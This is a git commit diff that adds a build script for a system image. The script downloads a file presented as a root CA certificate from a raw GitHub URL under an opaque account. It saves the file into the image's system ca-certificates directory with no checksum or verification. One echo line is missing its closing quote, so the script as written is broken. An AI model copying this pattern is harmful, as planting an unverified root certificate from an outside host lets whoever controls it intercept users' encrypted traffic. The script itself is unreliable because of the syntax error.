3457b655c065a1a89c08b836e12d4459fc30a567
test name <testmail@gmx.de>
2020-05-18 19:44:40 +0200

    -

--- 00003-add-ca-certificate.sh
+++ 00003-add-ca-certificate.sh
@@ -1,1 +1,8 @@
-test
+CA="https://raw.githubusercontent.com/P0c40lOEerbr6uj/hosts/master/02ab32bf.0"
+echo "Downloading Root CA certificate $CA"
+echo "Build dir: $BUILD_DIR"
+echo "Build dir files: $(ls $BUILD_DIR)
+echo "Build_dir/system files: $(ls $BUILD_DIR/system)"
+echo "Build_dir/system/ca-certificates files: $(ls $BUILD_DIR/system/ca-certificates/)"
+
+wget $CA -P $BUILD_DIR/system/ca-certificates/
